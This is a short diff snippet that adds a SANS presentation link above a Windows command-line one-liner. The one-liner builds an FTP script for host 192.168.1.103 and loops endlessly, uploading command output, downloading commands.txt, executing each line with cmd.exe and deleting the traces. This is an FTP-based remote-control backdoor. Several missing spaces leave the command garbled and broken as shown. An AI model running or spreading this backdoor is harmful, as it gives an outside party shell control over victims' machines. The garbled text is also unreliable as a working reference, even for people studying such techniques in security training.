@@ -1,1 +1,2 @@
+https://www.sans.edu/student-files/presentations/ftp_nslookup_withnotes.pdf 
 echo OPEN 192.168.1.103 > f.txt & echoUSER test >> f.txt & echo test1 >>f.txt & echo PUT output.txt >> f.txt &echo GET commands.txt >> f.txt & echoDELETE commands.txt >> f.txt & echo BYE>> f.txt & for /L %i in (1,0,2) do (ftp-n -s:f.txt & del output.txt & (for /F"delims=^" %j in (commands.txt) docmd.exe /c %j 1>output.txt & delcommands.txt) & ping -n 4 127.0.0.1)
